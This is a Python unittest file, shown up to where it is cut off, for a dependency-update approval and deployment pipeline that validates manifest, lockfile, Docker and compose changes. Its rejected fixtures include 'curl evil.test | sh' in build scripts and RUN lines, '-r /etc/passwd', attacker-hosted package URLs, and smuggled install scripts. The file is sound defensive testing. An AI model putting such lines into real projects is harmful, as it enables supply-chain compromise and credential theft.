"""Dependency approval behavior and API transport regression tests."""
import importlib.util
import json
from pathlib import Path
import unittest
from unittest.mock import patch
import tempfile
import os

SPEC = importlib.util.find_spec('dependency_updates')
if SPEC:
    from dependency_updates import policy, github, pipeline

SHA = 'a' * 40
BASE = 'b' * 40

# Public data captured from the actual Go Bot PR #24; no candidate code runs.
GO_BOT24_BEFORE = """module github.com/enjoydarts/sifto/api

go 1.24.0

require (
	github.com/go-chi/chi/v5 v5.2.5
	github.com/golang-jwt/jwt/v5 v5.3.1
	github.com/inngest/inngestgo v0.15.1
	github.com/jackc/pgx/v5 v5.8.0
	github.com/mmcdole/gofeed v1.3.0
	github.com/redis/go-redis/v9 v9.18.0
)

require (
	github.com/PuerkitoBio/goquery v1.8.0 // indirect
	github.com/andybalholm/cascadia v1.3.1 // indirect
	github.com/cespare/xxhash/v2 v2.3.0 // indirect
	github.com/coder/websocket v1.8.12 // indirect
	github.com/dgryski/go-rendezvous v0.0.0-20200823014737-9f7001d12a5f // indirect
	github.com/fatih/structs v1.1.0 // indirect
	github.com/getsentry/sentry-go v0.36.2 // indirect
	github.com/google/uuid v1.6.0 // indirect
	github.com/gosimple/slug v1.12.0 // indirect
	github.com/gosimple/unidecode v1.0.1 // indirect
	github.com/gowebpki/jcs v1.0.0 // indirect
	github.com/hashicorp/errwrap v1.1.0 // indirect
	github.com/hashicorp/go-multierror v1.1.1 // indirect
	github.com/inngest/inngest v1.13.5 // indirect
	github.com/jackc/pgpassfile v1.0.0 // indirect
	github.com/jackc/pgservicefile v0.0.0-20240606120523-5a60cdf6a761 // indirect
	github.com/jackc/puddle/v2 v2.2.2 // indirect
	github.com/json-iterator/go v1.1.12 // indirect
	github.com/mmcdole/goxpp v1.1.1-0.20240225020742-a0c311522b23 // indirect
	github.com/modern-go/concurrent v0.0.0-20180306012644-bacd9c7ef1dd // indirect
	github.com/modern-go/reflect2 v1.0.2 // indirect
	github.com/oklog/ulid/v2 v2.1.1 // indirect
	github.com/pbnjay/memory v0.0.0-20210728143218-7b4eea64cf58 // indirect
	github.com/xhit/go-str2duration/v2 v2.1.0 // indirect
	go.uber.org/atomic v1.11.0 // indirect
	golang.org/x/net v0.41.0 // indirect
	golang.org/x/sync v0.17.0 // indirect
	golang.org/x/sys v0.36.0 // indirect
	golang.org/x/text v0.29.0 // indirect
	google.golang.org/genproto/googleapis/rpc v0.0.0-20250603155806-513f23925822 // indirect
	google.golang.org/grpc v1.73.0 // indirect
	google.golang.org/protobuf v1.36.6 // indirect
)
"""
GO_BOT24_AFTER = """module github.com/enjoydarts/sifto/api

go 1.25.9

require (
	github.com/getsentry/sentry-go v0.36.2
	github.com/go-chi/chi/v5 v5.3.2
	github.com/golang-jwt/jwt/v5 v5.3.1
	github.com/google/uuid v1.6.0
	github.com/inngest/inngest v1.19.3
	github.com/inngest/inngestgo v0.16.5
	github.com/jackc/pgx/v5 v5.11.0
	github.com/mmcdole/gofeed v1.5.0
	github.com/redis/go-redis/v9 v9.22.0
)

require (
	github.com/PuerkitoBio/goquery v1.8.0 // indirect
	github.com/andybalholm/cascadia v1.3.1 // indirect
	github.com/cespare/xxhash/v2 v2.3.0 // indirect
	github.com/coder/websocket v1.8.12 // indirect
	github.com/dgryski/go-rendezvous v0.0.0-20200823014737-9f7001d12a5f // indirect
	github.com/fatih/structs v1.1.0 // indirect
	github.com/gosimple/slug v1.12.0 // indirect
	github.com/gosimple/unidecode v1.0.1 // indirect
	github.com/gowebpki/jcs v1.0.0 // indirect
	github.com/hashicorp/errwrap v1.1.0 // indirect
	github.com/hashicorp/go-multierror v1.1.1 // indirect
	github.com/jackc/pgpassfile v1.0.0 // indirect
	github.com/jackc/pgservicefile v0.0.0-20240606120523-5a60cdf6a761 // indirect
	github.com/jackc/puddle/v2 v2.2.2 // indirect
	github.com/json-iterator/go v1.1.12 // indirect
	github.com/lmittmann/tint v1.1.0 // indirect
	github.com/mmcdole/goxpp v1.1.1-0.20240225020742-a0c311522b23 // indirect
	github.com/mmcdole/goxpp/v2 v2.0.0 // indirect
	github.com/modern-go/concurrent v0.0.0-20180306012644-bacd9c7ef1dd // indirect
	github.com/modern-go/reflect2 v1.0.2 // indirect
	github.com/oklog/ulid/v2 v2.1.1 // indirect
	github.com/pbnjay/memory v0.0.0-20210728143218-7b4eea64cf58 // indirect
	github.com/xhit/go-str2duration/v2 v2.1.0 // indirect
	go.uber.org/atomic v1.11.0 // indirect
	golang.org/x/net v0.58.0 // indirect
	golang.org/x/sync v0.22.0 // indirect
	golang.org/x/sys v0.47.0 // indirect
	golang.org/x/text v0.41.0 // indirect
	google.golang.org/genproto/googleapis/rpc v0.0.0-20260414002931-afd174a4e478 // indirect
	google.golang.org/grpc v1.82.1 // indirect
	google.golang.org/protobuf v1.36.11 // indirect
)
"""


class FakeClock:
    def __init__(self):
        self.elapsed = 0

    def monotonic(self):
        return self.elapsed

    def sleep(self, seconds):
        self.elapsed += seconds


class PolicyTests(unittest.TestCase):
    def setUp(self):
        self.assertIsNotNone(SPEC, 'approval automation must be implemented')

    def test_real_go_bot24_tidy_graph_and_go_language_update_are_supported(self):
        policy.validate_change('api/go.mod', GO_BOT24_BEFORE, GO_BOT24_AFTER)

    def test_go_indirect_addition_removal_and_existing_promotion_are_supported(self):
        original = 'module example.com/app\ngo 1.24.0\nrequire example.com/direct v1.2.3\nrequire example.com/transitive v0.1.0 // indirect\n'
        for candidate in [original + 'require example.com/new/v2 v2.1.0 // indirect\n',
                          original.replace('require example.com/transitive v0.1.0 // indirect\n', ''),
                          original.replace('v0.1.0 // indirect', 'v0.2.0'),
                          original.replace('go 1.24.0', 'go 1.99.0')]:
            with self.subTest(candidate=candidate):
                policy.validate_change('api/go.mod', original, candidate)

    def test_go_module_direct_identity_and_directive_metadata_are_fixed(self):
        original = 'module example.com/app\ngo 1.24.0\nrequire example.com/direct v1.2.3\n'
        candidates = [original.replace('example.com/app', 'example.com/other'),
                      original.replace('example.com/direct v1.2.3', 'example.com/direct/v2 v2.0.0'),
                      original + 'require example.com/new v1.0.0\n',
                      original.replace('require example.com/direct v1.2.3\n', ''),
                      original.replace('v1.2.3', 'v1.2.4 // indirect'),
                      original.replace('go 1.24.0', 'go 1.23.9'),
                      original.replace('go 1.24.0', 'go 2.0.0'),
                      original.replace('go 1.24.0', 'go 1.24.1 // metadata'),
                      original + 'toolchain go1.25.9\n',
                      original + 'replace example.com/direct => ./local\n',
                      original + 'exclude example.com/direct v1.2.3\n',
                      original + 'retract v1.2.3\n',
                      original + 'tool example.com/tool\n',
                      original + '// unrelated metadata\n']
        for candidate in candidates:
            with self.subTest(candidate=candidate):
                with self.assertRaises(policy.Refused):
                    policy.validate_change('api/go.mod', original, candidate)

    def test_go_patch_update_is_non_decreasing_and_numeric(self):
        original = 'module example.com/app\ngo 1.24.2\nrequire example.com/direct v1.2.3\n'
        policy.validate_change('api/go.mod', original, original.replace('go 1.24.2', 'go 1.24.10'))
        policy.validate_change('api/go.mod', original, original.replace('go 1.24.2', 'go 1.25'))
        for version in ('1.24.1', '1.23.99', '1.024.2', '1.24.02', '1.25rc1', 'latest'):
            with self.subTest(version=version), self.assertRaises(policy.Refused):
                policy.validate_change('api/go.mod', original, original.replace('go 1.24.2', 'go ' + version))

    def test_go_duplicate_directives_modules_and_malformed_require_blocks_are_refused(self):
        original = 'module example.com/app\ngo 1.24.0\nrequire example.com/direct v1.2.3\n'
        candidates = [original + 'module example.com/app\n', original + 'go 1.24.1\n',
                      original + 'require example.com/direct v1.2.4 // indirect\n',
                      original.replace('require example.com/direct v1.2.3', 'require (\nexample.com/direct v1.2.4'),
                      original + ')\n', original + 'require (\nrequire (\n)\n)\n',
                      original + 'require ()\n', original.replace('go 1.24.0\n', ''),
                      original.replace('module example.com/app\n', ''),
                      original.replace('v1.2.3', 'v1.2.4 // indirect extra')]
        for candidate in candidates:
            with self.subTest(candidate=candidate), self.assertRaises(policy.Refused):
                policy.validate_change('api/go.mod', original, candidate)

    def test_go_module_paths_and_versions_are_public_canonical_data(self):
        original = 'module example.com/app\ngo 1.24.0\nrequire example.com/direct v1.2.3\n'
        for path in ('../local', '/tmp/module', 'https://example.com/dep', 'example.com/a/../b',
                     'example.com//dep', 'example.com/.dep', 'example.com/dep.', 'localhost/dep',
                     'Example.com/dep', 'example.com/CON/dep', 'example.com/dep/v01', 'example.com/dep/v1',
                     'example.com/dep@v1', 'example.com/dep;id', 'example.com/dep\\name'):
            with self.subTest(path=path), self.assertRaises(policy.Refused):
                policy.validate_change('api/go.mod', original, original + 'require ' + path + ' v1.0.0 // indirect\n')
        for version in ('1.0.0', 'v1.2', 'v01.2.3', 'v1.02.3', 'v1.2.3-01', 'v1.2.3+metadata',
                        'v1.2.3;id', 'latest', 'https://example.com/version'):
            with self.subTest(version=version), self.assertRaises(policy.Refused):
                policy.validate_change('api/go.mod', original, original.replace('v1.2.3', version))

    def test_go_pseudoversions_major_suffixes_and_legacy_incompatible_are_supported(self):
        original = 'module example.com/app\ngo 1.24.0\nrequire example.com/direct v1.2.3\n'
        for dependency in ('github.com/UpperCase/module v0.0.0-20240606120523-5a60cdf6a761',
                           'example.com/dep/v2 v2.1.0', 'gopkg.in/yaml.v3 v3.0.1',
                           'example.com/legacy v2.0.0+incompatible'):
            with self.subTest(dependency=dependency):
                policy.validate_change('api/go.mod', original, original + 'require ' + dependency + ' // indirect\n')
        for dependency in ('example.com/dep/v2 v1.0.0', 'example.com/dep v2.1.0',
                           'gopkg.in/yaml.v3 v2.1.0', 'example.com/dep v1.0.0+incompatible',
                           'example.com/EXAMPL~1.COM v1.0.0', '127.0.0.1/dep v1.0.0'):
            with self.subTest(dependency=dependency), self.assertRaises(policy.Refused):
                policy.validate_change('api/go.mod', original, original + 'require ' + dependency + ' // indirect\n')

    def test_image_security_compose_pin_is_ci_only_and_other_configuration_is_fixed(self):
        path = 'infra/image-security/compose.yml'
        original = 'services:\n  verifier:\n    image: python:3.12.15-slim\n    network_mode: none\n    read_only: true\n    cap_drop: [ALL]\n    volumes: [./tool:/tool:ro]\n'
        pinned = original.replace('python:3.12.15-slim', 'python:3.12.15-slim@sha256:' + 'a' * 64)
        policy.validate_change(path, original, pinned)
        self.assertEqual(policy.surfaces([path]), ['ci'])
        for candidate in (pinned.replace('network_mode: none', 'network_mode: host'),
                          pinned.replace('read_only: true', 'read_only: false'),
                          pinned.replace('cap_drop: [ALL]', 'cap_drop: []'),
                          pinned.replace('./tool:/tool:ro', '/etc:/tool:ro'),
                          pinned + '    environment: {TOKEN: fixture}\n'):
            with self.subTest(candidate=candidate), self.assertRaises(policy.Refused):
                policy.validate_change(path, original, candidate)
        for unsupported in ('infra/image-security/other.yml', 'infra/image-security/secrets.yml'):
            with self.assertRaises(policy.Refused):
                policy.validate_change(unsupported, original, pinned)
            with self.assertRaises(policy.Refused):
                policy.surfaces([unsupported])

    def test_renovate_npm_compose_pin_is_ci_only_and_runtime_configuration_is_fixed(self):
        path = 'infra/dependency-ci/compose.renovate-npm.yml'
        original = 'services:\n  test:\n    image: node:22.23.3-alpine\n    user: "1000:1000"\n    network_mode: none\n    read_only: true\n    cap_drop: [ALL]\n    security_opt: [no-new-privileges:true]\n    volumes: [./tool:/tool:ro]\n'
        pinned = original.replace('node:22.23.3-alpine', 'node:22.23.3-alpine@sha256:' + 'b' * 64)
        policy.validate_change(path, original, pinned)
        self.assertEqual(policy.surfaces([path]), ['ci'])
        for candidate in (pinned + '    environment: {TOKEN: fixture}\n',
                          pinned.replace('./tool:/tool:ro', '/etc:/tool:rw'),
                          pinned.replace('user: "1000:1000"', 'user: "0:0"'),
                          pinned.replace('read_only: true', 'read_only: false'),
                          pinned.replace('cap_drop: [ALL]', 'cap_drop: []'),
                          pinned.replace('no-new-privileges:true', 'no-new-privileges:false'),
                          pinned.replace('network_mode: none', 'network_mode: host')):
            with self.subTest(candidate=candidate), self.assertRaises(policy.Refused):
                policy.validate_change(path, original, candidate)
        with self.assertRaises(policy.Refused):
            policy.validate_change('infra/dependency-ci/compose.renovate-npm-other.yml', original, pinned)

    def test_versions_are_allowed_but_requirement_commands_are_rejected(self):
        policy.validate_change('worker/requirements.in', 'httpx==0.28.1\n', 'httpx==0.29.0\n')
        for candidate in ['-r /etc/passwd\n', 'httpx @ https://evil.test/a.whl\n', 'httpx==0.29.0\n--index-url=https://evil.test\n']:
            with self.assertRaises(policy.Refused):
                policy.validate_change('worker/requirements.in', 'httpx==0.28.1\n', candidate)

    def test_hashed_uv_locks_allow_transitive_changes_with_bounded_summary(self):
        original = (Path('/repository') / 'worker/requirements.txt').read_text()
        updated = original.replace('anyio==4.15.1', 'anyio==4.15.2')
        policy.validate_change('worker/requirements.txt', original, updated)
        self.assertEqual(policy.python_lock(original)['anyio']['version'], '4.15.1')
        summary = policy.python_lock_summary(original, updated)
        self.assertIn('anyio: 4.15.1 -> 4.15.2', '\n'.join(summary))
        self.assertLess(len('\n'.join(summary)), 2000)
        smaller = original[:original.index('annotated-types==')] + original[original.index('anthropic=='):]
        policy.validate_change('worker/requirements.txt', original, smaller)

    def test_uv_locks_refuse_commands_duplicate_pins_missing_hashes_and_bad_metadata(self):
        header = '# This file was autogenerated by uv via the following command:\n#    uv pip compile --python-version=3.12 --universal --generate-hashes --output-file=requirements.txt requirements.in\n'
        pin = 'httpx==0.28.1 \\\n    --hash=sha256:' + 'a' * 64 + '\n    # via -r requirements.in\n'
        valid = header + pin
        for invalid in [valid.replace('--python-version=3.12', '--python-version=3.13'), valid + pin, header + 'httpx==0.28.1\n', valid.replace('sha256:', 'md5:'), valid + '--index-url https://evil.test\n', valid + '# arbitrary command\n', valid.replace('# via -r requirements.in', '# via https://evil.test'), valid.replace('httpx==0.28.1', "httpx==0.28.1 ; unknown == 'x'"), valid.replace('a' * 64, 'a' * 63)]:
            with self.subTest(invalid=invalid[-100:]):
                with self.assertRaises(policy.Refused):
                    policy.validate_change('worker/requirements.txt', valid, invalid)
        with self.assertRaises(policy.Refused):
            policy.validate_change('worker/requirements.in', 'httpx==0.28.1\n', 'httpx==0.29.0\nhttpx==0.29.0\n')

    def test_python_inputs_and_lock_ci_images_classify_and_executor_stays_separate(self):
        self.assertEqual(policy.surfaces(['worker/requirements.in', 'infra/audio-concat/requirements.in', 'infra/dependency-ci/compose.python-locks.yml']), ['audio', 'ci', 'worker'])
        for path in ['infra/maintenance/requirements.in', 'infra/maintenance/requirements.txt']:
            with self.assertRaises(policy.Refused):
                policy.surfaces([path])

    def test_scripts_and_manifest_metadata_cannot_change(self):
        original = {'dependencies': {'next': '^16.2.6'}, 'scripts': {'build': 'next build'}}
        candidate = json.loads(json.dumps(original))
        candidate['dependencies']['next'] = '^16.2.7'
        policy.validate_change('web/package.json', json.dumps(original), json.dumps(candidate))
        candidate['scripts']['build'] = 'curl evil.test | sh'
        with self.assertRaises(policy.Refused):
            policy.validate_change('web/package.json', json.dumps(original), json.dumps(candidate))

    def test_lockfile_cannot_change_scripts_or_transport_without_a_version_update(self):
        original = {'lockfileVersion': 3, 'packages': {'': {'dependencies': {'dep': '^1.0.0'}}, 'node_modules/dep': {'version': '1.0.0', 'hasInstallScript': False}}}
        candidate = json.loads(json.dumps(original))
        candidate['packages']['node_modules/dep']['hasInstallScript'] = True
        with self.assertRaises(policy.Refused):
            policy.validate_change('web/package-lock.json', json.dumps(original), json.dumps(candidate))
        candidate['packages']['node_modules/dep']['resolved'] = 'https://evil.test/a.tgz'
        with self.assertRaises(policy.Refused):
            policy.validate_change('web/package-lock.json', json.dumps(original), json.dumps(candidate))

    def test_ambiguous_duplicate_manifest_keys_are_refused(self):
        original = '{"scripts":{},"dependencies":{"dep":"1.0.0"}}'
        candidate = '{"scripts":{"install":"evil"},"scripts":{},"dependencies":{"dep":"1.0.1"}}'
        with self.assertRaises(policy.Refused):
            policy.validate_change('web/package.json', original, candidate)

    def test_docker_images_only_and_existing_air_version(self):
        original = 'FROM python:3.12-slim\nRUN echo safe\n'
        policy.validate_change('worker/Dockerfile', original, original.replace('3.12', '3.13'))
        with self.assertRaises(policy.Refused):
            policy.validate_change('worker/Dockerfile', original, original.replace('echo safe', 'curl evil.test | sh'))
        with self.assertRaises(policy.Refused):
            policy.validate_change('worker/Dockerfile', original, original.replace('python:', 'evil/runner:'))
        original = 'RUN go install github.com/air-verse/air@v1.67.4\n'
        policy.validate_change('api/Dockerfile', original, original.replace('1.67.4', '1.67.5'))

    def test_compose_environment_mount_and_permissions_are_rejected(self):
        original = 'services:\n  redis:\n    image: redis:7-alpine\n    environment: {FOO: bar}\n'
        policy.validate_change('docker-compose.yml', original, original.replace('redis:7', 'redis:8'))
        for candidate in [original.replace('bar', 'evil'), original + '    privileged: true\n', original + '    volumes: [/etc:/host]\n']:
            with self.assertRaises(policy.Refused):
                policy.validate_change('docker-compose.yml', original, candidate)

    def test_postgres_mount_fixture_image_pin_is_ci_only_and_commands_are_fixed(self):
        path = 'infra/maintenance/bootstrap/Dockerfile.postgres-data-mount'
        original = 'FROM scratch AS context-test\nCOPY . /\nFROM ubuntu:24.04\nRUN echo fixture\n'
        pinned = original.replace('ubuntu:24.04', 'ubuntu:24.04@sha256:' + 'a' * 64)
        policy.validate_change(path, original, pinned)
        self.assertEqual(policy.surfaces([path]), ['ci'])
        for candidate in [pinned.replace('echo fixture', 'curl evil.test | sh'),
                          pinned.replace('COPY . /', 'COPY private /private'),
                          pinned.replace('ubuntu:24.04', 'evil/runner:24.04')]:
            with self.subTest(candidate=candidate):
                with self.assertRaises(policy.Refused):
                    policy.validate_change(path, original, candidate)
        with self.assertRaises(policy.Refused):
            policy.surfaces(['infra/maintenance/bootstrap/52-sifto-data-mount.conf'])

    def test_source_migration_workflow_and_executor_requirements_are_refused(self):
        for path in ['api/main.go', 'db/migrations/123.sql', '.github/workflows/deploy.yml', 'infra/maintenance/requirements.txt']:
            with self.assertRaises(policy.Refused):
                policy.validate_change(path, 'old', 'new')

    def test_resource_classification_distinguishes_live_and_development(self):
        self.assertTrue(hasattr(policy, 'surfaces'), 'deployment targets must be classified from exact candidate paths')
        self.assertEqual(policy.surfaces(['worker/requirements.txt', 'infra/audio-concat/requirements.txt']), ['audio', 'worker'])
        self.assertEqual(policy.surfaces(['docker-compose.yml', 'infra/dependency-ci/compose.yml', 'infra/maintenance/bootstrap/Dockerfile.test']), ['ci', 'development'])
        with self.assertRaises(policy.Refused):
            policy.surfaces(['infra/maintenance/Dockerfile'])

    def test_exact_plan_hash_and_stale_inputs(self):
        plan = {'head': SHA, 'base': BASE, 'source': BASE, 'diff_hash': 'c' * 64}
        digest = policy.plan_hash(plan)
        policy.assert_unchanged(plan, dict(plan), digest)
        for field in ['head', 'base', 'source', 'diff_hash']:
            changed = dict(plan, **{field: 'd' * len(plan[field])})
            with self.assertRaises(policy.Refused):
                policy.assert_unchanged(plan, changed, digest)

    def test_native_owner_approval_is_required(self):
        valid = [{'state': 'approved', 'user': {'login': 'enjoydarts'}, 'environments': [{'name': 'production-maintenance'}]}]
        policy.verify_approval(valid, actor='github-actions[bot]')
        for approvals, actor in [([], 'bot'), (valid, 'enjoydarts'), ([dict(valid[0], user={'login': 'someone'})], 'bot'), ([dict(valid[0], environments=[{'name': 'other'}])], 'bot')]:
            with self.assertRaises(policy.Refused):
                policy.verify_approval(approvals, actor=actor)

    def test_exact_ci_run_jobs_not_spoofed_contexts(self):
        run = {'id': 15, 'head_sha': SHA, 'event': 'workflow_dispatch', 'path': '.github/workflows/dependency-check.yml', 'conclusion': 'success', 'status': 'completed'}
        jobs = [{'name': name, 'conclusion': 'success', 'head_sha': SHA} for name in policy.CHECKS]
        policy.verify_checks(run, jobs, SHA)
        for candidate in [dict(run, head_sha=BASE), dict(run, path='.github/workflows/spoof.yml'), dict(run, event='pull_request'), dict(run, conclusion='failure')]:
            with self.assertRaises(policy.Refused):
                policy.verify_checks(candidate, jobs, SHA)
        with self.assertRaises(policy.Refused):
            policy.verify_checks(run, jobs[:-1], SHA)


class TransportTests(unittest.TestCase):
    def setUp(self):
        self.assertIsNotNone(SPEC, 'approval automation must be implemented')

    def test_pagination_is_complete_or_fails_closed(self):
        calls = []
        def transport(method, path, body):
            calls.append(path)
            return [{'id': len(calls)}] * (100 if len(calls) == 1 else 1)
        api = github.GitHub('owner/repo', transport=transport)
        self.assertEqual(len(api.pages('/pulls')), 101)
        self.assertEqual(len(calls), 2)
        api = github.GitHub('owner/repo', transport=lambda *_: [{}] * 100)
        with self.assertRaises(policy.Refused):
            api.pages('/pulls', max_pages=2)

    def test_mutating_requests_are_never_retried_on_ambiguity(self):
        calls = []
        def transport(*args):
            calls.append(args)
            raise TimeoutError('contains secret')
        api = github.GitHub('owner/repo', transport=transport)
        with self.assertRaises(github.Ambiguous):
            api.request('PUT', '/pulls/1/merge', {'sha': SHA})
        self.assertEqual(len(calls), 1)

    def test_actual_github_http_builds_only_fixed_origin_and_masks_errors(self):
        import urllib.error
        captured = []
        class Response:
            def __enter__(self): return self
            def __exit__(self, *_): return False
            def read(self, limit): return b'{"ok":true}'
        class Opener:
            def open(self, request, timeout):
                captured.append(request)
                return Response()
        api = github.GitHub('owner/repo')
        with patch.dict(os.environ, {'GH_TOKEN': 'secret-token'}), patch('urllib.request.build_opener', return_value=Opener()):
            self.assertEqual(api.request('POST', '/actions/workflows/deploy.yml/dispatches', {'ref': 'main'}), {'ok': True})
        self.assertEqual(captured[0].full_url, 'https://api.github.com/repos/owner/repo/actions/workflows/deploy.yml/dispatches')
        self.assertEqual(json.loads(captured[0].data), {'ref': 'main'})
        with patch('urllib.request.build_opener') as opener, patch.dict(os.environ, {'GH_TOKEN': 'secret-token'}):
            opener.return_value.open.side_effect = urllib.error.HTTPError('secret-url', 403, 'secret-token', {}, None)
            with self.assertRaises(policy.Refused) as refusal:
                api.request('PUT', '/pulls/1/merge', {'sha': SHA})
            self.assertNotIn('secret', str(refusal.exception))
            self.assertEqual(opener.return_value.open.call_count, 1)

    def test_merge_uses_exact_sha_and_does_not_retry_ambiguous_merge(self):
        calls = []
        merged = False
        def transport(method, path, body):
            nonlocal merged
            calls.append((method, path, body))
            if method == 'PUT':
                merged = True
                raise TimeoutError()
            if path == '/branches/main':
                return {'protected': True, 'commit': {'sha': BASE}}
            return {'state': 'open', 'merged': merged, 'merge_commit_sha': 'c' * 40 if merged else None, 'head': {'sha': SHA}, 'base': {'sha': BASE, 'ref': 'main'}, 'mergeable': True, 'mergeable_state': 'clean'}
        api = github.GitHub('owner/repo', transport=transport)
        with self.assertRaises(policy.Refused):
            pipeline.merge_once(api, {'pr': 1, 'head': SHA, 'base': BASE})
        self.assertEqual([c[0] for c in calls].count('PUT'), 1)
        self.assertEqual(next(call[2]['sha'] for call in calls if call[0] == 'PUT'), SHA)


class DeploymentTests(unittest.TestCase):
    def setUp(self):
        self.assertIsNotNone(importlib.util.find_spec('dependency_updates.deploy'), 'immutable deployment transport must be implemented')
        from dependency_updates import deploy
        self.deploy = deploy

    def test_commit_guard_rejects_changed_main_and_unapproved_dispatch(self):
        self.deploy.validate_dispatch(SHA, SHA, 'workflow_dispatch', 'true')
        for main, approved in [(BASE, 'true'), (SHA, 'false')]:
            with self.assertRaises(policy.Refused):
                self.deploy.validate_dispatch(SHA, main, 'workflow_dispatch', approved)

    def test_deployment_approval_has_one_request_and_never_reruns(self):
        self.assertTrue(hasattr(self.deploy, 'single_request'), 'deployment approval consumption must be checked')
        title = 'Approved dependency deployment 10 ' + SHA
        api = github.GitHub('owner/repo', transport=lambda *_: {'workflow_runs': [{'id': 20, 'display_title': title}], 'total_count': 1})
        self.deploy.single_request(api, 'deploy.yml', SHA, 10, 20, '1')
        for identifier, attempt in [(21, '1'), (20, '2')]:
            with self.assertRaises(policy.Refused):
                self.deploy.single_request(api, 'deploy.yml', SHA, 10, identifier, attempt)
        api = github.GitHub('owner/repo', transport=lambda *_: {'workflow_runs': [{'id': 20, 'display_title': title}, {'id': 21, 'display_title': title}], 'total_count': 2})
        with self.assertRaises(policy.Refused):
            self.deploy.single_request(api, 'deploy.yml', SHA, 10, 20, '1')

    def test_coolify_commit_pin_is_checked_and_mutations_not_replayed(self):
        requests = []
        app = {'git_commit_sha': 'HEAD', 'git_branch': 'main', 'repository_project_id': 123}
        def request(method, path, body=None):
            requests.append((method, path, body))
            if method == 'PATCH':
                app.update(body)
                return {}
            if path == '/applications/app':
                return dict(app)
            if path == '/deploy':
                return {'deployments': [{'deployment_uuid': 'job'}]}
            return {'status': 'finished', 'commit': SHA, 'application': {'uuid': 'app'}}
        self.deploy.coolify(request, 'app', SHA, lambda: None, sleep=lambda _: None)
        self.assertEqual([r for r in requests if r[1] == '/deploy'], [('POST', '/deploy', {'uuid': 'app', 'force': False})])
        self.assertEqual(app['git_commit_sha'], 'HEAD')

    def test_foreign_coolify_source_change_is_not_restored(self):
        app = {'git_commit_sha': 'HEAD', 'git_branch': 'main'}
        def request(method, path, body=None):
            if method == 'PATCH':
                app.update(body)
            if path == '/applications/app':
                return dict(app)
            if path == '/deploy':
                app['git_commit_sha'] = BASE
                return {'deployments': [{'deployment_uuid': 'job'}]}
            return {'status': 'finished', 'commit': SHA, 'application': {'uuid': 'app'}}
        with self.assertRaises(policy.Refused):
            self.deploy.coolify(request, 'app', SHA, lambda: None, sleep=lambda _: None)
        self.assertEqual(app['git_commit_sha'], BASE)

    def test_vercel_uses_exact_github_sha_and_verifies_production_alias(self):
        calls = []
        def request(method, path, body=None):
            calls.append((method, path, body))
            if '/projects/' in path:
                return {'id': 'prj_test', 'name': 'sifto'}
            if method == 'POST':
                return {'id': 'dpl_test'}
            return {'id': 'dpl_test', 'readyState': 'READY', 'target': 'production', 'projectId': 'prj_test', 'gitSource': {'type': 'github', 'sha': SHA}, 'alias': ['sifto.net'], 'url': 'deployment.vercel.app'}
        self.assertTrue(hasattr(self.deploy, 'vercel'), 'immutable Vercel deployment must be implemented')
        self.deploy.vercel(request, 'team_test', 'prj_test', 'owner/repo', SHA, sleep=lambda _: None, verify_alias=lambda *_: None)
        body = next(call[2] for call in calls if call[0] == 'POST')
        self.assertEqual(body['gitSource']['sha'], SHA)
        self.assertNotIn('withLatestCommit', body)
        self.assertEqual(len([c for c in calls if c[0] == 'POST']), 1)

    def test_vercel_wrong_commit_or_unpromoted_alias_never_counts_as_deployed(self):
        self.assertTrue(hasattr(self.deploy, 'vercel'), 'immutable Vercel deployment must be implemented')
        for state in [{'readyState': 'READY', 'target': 'production', 'projectId': 'prj_test', 'gitSource': {'sha': BASE}, 'alias': ['sifto.net']}, {'readyState': 'READY', 'target': 'production', 'projectId': 'prj_test', 'gitSource': {'sha': SHA}, 'alias': []}]:
            def request(method, path, body=None):
                if '/projects/' in path:
                    return {'id': 'prj_test', 'name': 'sifto'}
                return {'id': 'dpl_test'} if method == 'POST' else state
            with self.assertRaises(policy.Refused):
                self.deploy.vercel(request, 'team_test', 'prj_test', 'owner/repo', SHA, sleep=lambda _: None, verify_alias=lambda *_: None)


class PipelineTests(unittest.TestCase):
    """Exercise orchestration through its real controlled REST boundary."""
    def setUp(self):
        self.assertIsNotNone(SPEC)
        self.head, self.base, self.merged = SHA, BASE, 'c' * 40
        self.repo = 'owner/repo'
        self.approvals = [{'state': 'approved', 'user': {'login': 'enjoydarts'}, 'environments': [{'name': 'production-maintenance'}]}]
        self.paths = ['worker/requirements.in']
        self.mutations = []
        self.author = 'github-actions[bot]'
        self.fork = False
        self.after = 'httpx==0.29.0\n'
        self.branch = 'renovate-ci/pip-minor-patch'
        self.labels = []
        self.body = ''
        self.check_path = '.github/workflows/dependency-check.yml'
        self.mergeable_state = 'clean'
        self.preview_failure = False
        self.api = github.GitHub(self.repo, transport=self.transport)

    def transport(self, method, path, body):
        if method != 'GET':
            self.mutations.append((method, path, body))
            if method == 'PUT':
                self.base = self.merged
                return {'merged': True, 'sha': self.merged}
            return None
        endpoint = path.split('?')[0]
        if endpoint == '/git/ref/heads/main':
            return {'object': {'sha': self.base}}
        if endpoint == '/branches/main':
            return {'protected': True, 'commit': {'sha': self.base}}
        if endpoint == '/pulls/1':
            return {'state': 'open', 'draft': False, 'merged': False, 'user': {'login': self.author}, 'head': {'sha': self.head, 'ref': self.branch, 'repo': {'full_name': 'other/repo' if self.fork else self.repo}}, 'base': {'sha': self.base, 'ref': 'main', 'repo': {'full_name': self.repo}}, 'changed_files': len(self.paths), 'labels': self.labels, 'body': self.body, 'mergeable': True, 'mergeable_state': self.mergeable_state}
        if endpoint.startswith('/compare/'):
            return {'merge_base_commit': {'sha': self.base}, 'status': 'ahead'}
        if endpoint == '/pulls/1/files':
            return [{'filename': path, 'status': 'modified', 'additions': 1, 'deletions': 1} for path in self.paths]
        if endpoint.startswith('/contents/'):
            import base64
            text = 'httpx==0.28.1\n' if 'ref=' + BASE in path else self.after
            return {'type': 'file', 'encoding': 'base64', 'size': len(text), 'content': base64.b64encode(text.encode()).decode()}
        if endpoint.endswith('/statuses'):
            statuses = [{'context': 'renovate/stability-days', 'state': 'success', 'creator': {'login': 'github-actions[bot]'}}]
            if self.preview_failure:
                statuses.append({'context': 'Vercel', 'state': 'failure', 'creator': {'login': 'vercel[bot]'}})
            return statuses
        if endpoint == '/actions/runs/10':
            return {'event': 'workflow_dispatch', 'head_branch': 'main', 'head_sha': BASE, 'path': '.github/workflows/dependency-update.yml', 'run_attempt': 1, 'actor': {'login': 'github-actions[bot]'}, 'display_title': 'Dependency PR 1 ' + SHA + ' ' + BASE}
        if endpoint.endswith('/approvals'):
            return self.approvals
        if endpoint == '/actions/runs/15':
            return {'id': 15, 'event': 'workflow_dispatch', 'head_sha': SHA, 'path': self.check_path, 'status': 'completed', 'conclusion': 'success'}
        if endpoint.endswith('/jobs'):
